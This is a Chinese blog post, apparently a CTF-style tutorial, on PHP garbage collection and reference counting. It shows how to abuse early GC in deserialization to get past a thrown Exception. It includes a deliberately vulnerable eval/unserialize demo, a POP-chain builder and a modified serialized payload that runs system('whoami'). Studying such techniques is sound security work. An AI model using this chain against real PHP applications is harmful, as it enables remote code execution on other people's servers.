@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>PHP GC回收机制及其利用 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="PHP GC回收机制及其利用 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/03/02/PHP%20GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%88%A9%E7%94%A8/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T09:40:30.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">PHP GC回收机制及其利用</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="PHP-GC介绍"><a href="#PHP-GC介绍" class="headerlink" title="PHP GC介绍"></a>PHP GC介绍</h1><p>GC的全称是<code>Garbage Collection</code>也就是<strong>垃圾回收</strong>的意思<br>在PHP中，是使用<code>引用计数</code>和<code>回收周期</code>来自动管理内存对象的，当一个对象被设置为NULL，或者没有任何指针指向时，他就会变成垃圾，被GC机制回收掉，这里其实就可以理解为当一个对象没有被引用时，也就是基本类型(字符串，整形等等），被引用也就是一个对象(Object），在这可以理解为一个对象没有被引用时就会被GC机制回收<br>先引入一个函数<code>xdebug_debug_zval</code>，这是用来查看变量容器的内容的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674922716199-d118aacd-62e5-44c9-a3ed-9b368dd7ad95.png#averageHue=%232c2d29&clientId=udfea9d82-061d-4&from=paste&height=70&id=u185405a5&name=image.png&originHeight=87&originWidth=1591&originalType=binary&ratio=1&rotation=0&showTitle=false&size=211606&status=done&style=none&taskId=u43f8ddef-dcaa-4718-9ec3-4b8ba9461d7&title=&width=1272.8" alt="image.png"><br>在PHP CG机制当中，当程序结束时就会往变量的refcount减一，如果refcount-1&#x3D;0的话，那么就会将这个变量销毁</p>
+<h1 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h1><p>在上面的例子中可以看到<code>recount、is_ref</code>2个名字，recount表示的是指向变量<code>a</code>容器的变量个数，<code>is_ref</code>是boolean类型的，表示该变量是否被引用<br>回到上述例子，在上述例子中定义的是一个字符串类型的变量，因此<code>is_ref==0</code>，因为并没有被引用，但是我们如果修改一下代码，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674922915964-ec548a76-3ab0-45ac-9dd5-15f3dd33cc2d.png#averageHue=%232e2e2b&clientId=udfea9d82-061d-4&from=paste&height=108&id=u9828752c&name=image.png&originHeight=135&originWidth=1567&originalType=binary&ratio=1&rotation=0&showTitle=false&size=319445&status=done&style=none&taskId=ub715cea3-4daa-4af1-a9e4-16b3cd6c039&title=&width=1253.6" alt="image.png"><br>可以看到is_ref为1，refcount为2，符合我们上述所说的规则，那假如是数组又会发生什么呢？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;test&quot;</span>,<span class="number">1</span>=&gt;&amp;<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&quot;arr&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674922998500-1835a89d-6c72-4856-b5b3-32186d1e2106.png#averageHue=%232f2f2b&clientId=udfea9d82-061d-4&from=paste&height=71&id=u95ba256e&name=image.png&originHeight=89&originWidth=1336&originalType=binary&ratio=1&rotation=0&showTitle=false&size=185221&status=done&style=none&taskId=ue718f77c-1add-48ca-9463-67623f013d2&title=&width=1068.8" alt="image.png"><br>发现在数组中也同样生效，那假如我们再debug之前把变量销毁了呢？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;test&quot;</span>,<span class="number">1</span>=&gt;&amp;<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&quot;arr&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;test&quot;</span>,<span class="number">1</span>=&gt;&amp;<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&quot;arr&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>上述两种情况分别对应2种结果：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674923117217-46549a2d-66ce-4372-9000-9f2ad5adb096.png#averageHue=%23333430&clientId=udfea9d82-061d-4&from=paste&height=561&id=u19da2355&name=image.png&originHeight=701&originWidth=1722&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1709720&status=done&style=none&taskId=u3809a3dd-ed4c-4877-9c76-b56ea0b740c&title=&width=1377.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674923107615-7e6153a4-13bf-47f6-b039-6562c2b5fda2.png#averageHue=%23333430&clientId=udfea9d82-061d-4&from=paste&height=570&id=XYf2j&name=image.png&originHeight=713&originWidth=1721&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1743311&status=done&style=none&taskId=ua2f97e22-adeb-4baf-a081-52bdaab8f30&title=&width=1376.8" alt="image.png">第一种结果虽然结果为空，但是refcount还是不会为1，也就是不会被销毁，而第二种则会被销毁</p>
+<h1 id="PHP-GC在反序列化中的运用"><a href="#PHP-GC在反序列化中的运用" class="headerlink" title="PHP GC在反序列化中的运用"></a>PHP GC在反序列化中的运用</h1><p>首先我们引入一个正常的Demo：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;num=<span class="variable">$num</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;construct(&quot;</span>.<span class="variable">$num</span>.<span class="string">&quot;)&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct(&quot;</span>.<span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;)&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">gc</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">gc</span>(<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">gc</span>(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674923565483-729eb26f-1ae1-493a-93e0-6d493e23b9b0.png#averageHue=%232c2d29&clientId=udfea9d82-061d-4&from=paste&height=249&id=ue6cd4c8c&name=image.png&originHeight=311&originWidth=1732&originalType=binary&ratio=1&rotation=0&showTitle=false&size=765002&status=done&style=none&taskId=u0326f9a6-5190-4571-bd8c-eb0915614eb&title=&width=1385.6" alt="image.png"><br>构造函数创建顺序和销毁顺序都符合我们的预想和规则，在这里用zval函数去看看情况：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674923609180-fb76773f-1f26-4c0e-9a85-0b5d73bcccba.png#averageHue=%232c2c29&clientId=udfea9d82-061d-4&from=paste&height=162&id=u0635c07a&name=image.png&originHeight=202&originWidth=871&originalType=binary&ratio=1&rotation=0&showTitle=false&size=259833&status=done&style=none&taskId=u9d9911a6-9060-4a78-aaef-e8785dca22a&title=&width=696.8" alt="image.png"><br>可以看到refcount为1，所以在程序结束时候销毁了，加入我们不给a赋值，就是直接new一个gc类会发生什么？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;num=<span class="variable">$num</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;construct(&quot;</span>.<span class="variable">$num</span>.<span class="string">&quot;)&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct(&quot;</span>.<span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;)&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">gc</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">gc</span>(<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">gc</span>(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674923811906-5666fcb5-73de-4843-baa9-e21a046b353b.png#averageHue=%232c2c29&clientId=udfea9d82-061d-4&from=paste&height=178&id=u5b6b7fc3&name=image.png&originHeight=223&originWidth=1429&originalType=binary&ratio=1&rotation=0&showTitle=false&size=461917&status=done&style=none&taskId=ue9b6c2c5-4d27-493c-b1ca-b1cfba19727&title=&width=1143.2" alt="image.png"><br>发现1号的析构方法提前触发了，因为这个对象没进行赋值，所以根本不存在引用，因此原地销毁。</p>
+<h2 id="绕过Exception异常"><a href="#绕过Exception异常" class="headerlink" title="绕过Exception异常"></a>绕过Exception异常</h2><p>这是这个gc回收机制最常出现的地方，在此之前我们继续分析一下上述例子，我们将代码改为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;num=<span class="variable">$num</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;construct(&quot;</span>.<span class="variable">$num</span>.<span class="string">&quot;)&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct(&quot;</span>.<span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;)&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="keyword">new</span> <span class="title function_ invoke__">gc</span>(<span class="number">1</span>),<span class="number">1</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//$arr[0]=$arr[1];</span></span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;arr&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">gc</span>(<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">gc</span>(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+<p>这时输出结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674924172872-d385baaf-6f9f-4d17-8682-ad070f0f99a5.png#averageHue=%232c2c29&clientId=udfea9d82-061d-4&from=paste&height=219&id=ucf837248&name=image.png&originHeight=274&originWidth=1668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=668616&status=done&style=none&taskId=ufd119699-43e2-4fed-bd9f-cef531d90b6&title=&width=1334.4" alt="image.png"><br>很正常的输出结果，假如把注释取消，将0指向NULL，会发生什么？<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674924194059-889fb198-cb4f-4f4a-b8c4-5a89f7bb5914.png#averageHue=%232d2d2a&clientId=udfea9d82-061d-4&from=paste&height=228&id=ubf73e288&name=image.png&originHeight=285&originWidth=1580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=655876&status=done&style=none&taskId=ubcd10089-27ca-4f6d-a6cb-17d092c05b3&title=&width=1264" alt="image.png"><br>和预想中的一样，会原地销毁这个变量，destruct提前触发，那么接下来我们就利用这一点去绕过Exception：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;hello __destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __toString&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;useless&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello __flag()&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Garbage collection&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这是一个小案例，很简单的一个pop链，按照正常逻辑来看，触发逻辑很正常就是<code>gc0::__destruct-&gt;gc1::__tostring-&gt;gc2::flag()</code><br>构造正常逻辑pop链：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;system(&quot;whoami&quot;)&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> gc0;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> gc1;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> gc2;</span><br><span class="line"><span class="variable">$a</span>-&gt;num=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="keyword">string</span>=<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674924637490-3c815772-df6b-4599-b9bf-b97b16c2ba53.png#averageHue=%232f302d&clientId=udfea9d82-061d-4&from=paste&height=514&id=u4d8129bf&name=image.png&originHeight=642&originWidth=1901&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1721860&status=done&style=none&taskId=u81706637-5dac-4424-90b0-4ad4bf11723&title=&width=1520.8" alt="image.png"><br>结果就不出意料的抛出了异常，因为在destruct触发前，触发了Exception，因此在这里就要利用GC回收机制进行一个绕过，我们修改一下pop：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gc2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;system(&quot;whoami&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> gc0;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> gc1;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> gc2;</span><br><span class="line"><span class="variable">$a</span>-&gt;num=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="keyword">string</span>=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$a</span>,<span class="number">1</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>
+<p>得到结果<code>a:2:&#123;i:0;O:3:&quot;gc0&quot;:1:&#123;s:3:&quot;num&quot;;O:3:&quot;gc1&quot;:1:&#123;s:6:&quot;string&quot;;O:3:&quot;gc2&quot;:1:&#123;s:3:&quot;cmd&quot;;s:17:&quot;system(&quot;whoami&quot;);&quot;;&#125;&#125;&#125;i:1;N;&#125;</code>这时候我们把键名1改为0，也就是修改结果为<code>a:2:&#123;i:0;O:3:&quot;gc0&quot;:1:&#123;s:3:&quot;num&quot;;O:3:&quot;gc1&quot;:1:&#123;s:6:&quot;string&quot;;O:3:&quot;gc2&quot;:1:&#123;s:3:&quot;cmd&quot;;s:17:&quot;system(&quot;whoami&quot;);&quot;;&#125;&#125;&#125;i:0;N;&#125;</code>，这不就等效于将0指向了NULL，从而提前销毁吗<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674925396072-f4979a8a-403a-41a3-9ca9-37698a2636c4.png#averageHue=%23313330&clientId=udfea9d82-061d-4&from=paste&height=571&id=u9bfc1f41&name=image.png&originHeight=714&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1859594&status=done&style=none&taskId=u96a55cd5-7562-45fe-918f-fd19cda5d1c&title=&width=1536" alt="image.png"><br>成功运行whoami指令，这就是一个很好的小案例</p>
